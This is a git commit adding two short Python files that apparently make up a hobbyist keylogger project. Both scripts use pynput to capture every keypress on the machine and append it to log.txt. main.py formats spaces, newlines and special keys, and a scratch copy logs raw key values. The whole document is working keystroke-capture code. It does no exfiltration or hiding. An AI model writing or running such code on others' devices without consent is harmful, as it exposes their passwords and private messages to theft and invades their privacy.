5f23e804625b6e221b3d08d4955e0e092b18fbf5
Ghayur <154737827+ghayurcodes@users.noreply.github.com>
2024-12-17 12:18:25 +0500

    Initial commit

---
+++ main.py
@@ -0,0 +1,22 @@
+from pynput.keyboard import Listener
+
+def addtofile(key):
+    keydata = str(key).replace("'", "")  # Remove quotes around the key representation
+    try:
+        with open("log.txt", 'a') as f:
+            if keydata == 'Key.space':
+                f.write(' ')
+            elif keydata == 'Key.enter':
+                f.write('\n')
+            elif keydata.startswith("Key"):
+                f.write(f' [{keydata}] ')
+            else:
+                print(keydata)
+                f.write(keydata)
+    except Exception as e:
+
+        print(f"Error writing to file: {e}")
+
+with Listener(on_press=addtofile) as l:
+    l.join()
+    
---
+++ tempCodeRunnerFile.py
@@ -0,0 +1,13 @@
+from pynput.keyboard import Listener
+
+
+def addtofile(key):
+    keydata=str(key)
+    with open("log.txt",'a') as f:
+        f.write(keydata)
+
+
+
+
+with Listener(on_press=addtofile) as l:
+    l.join()
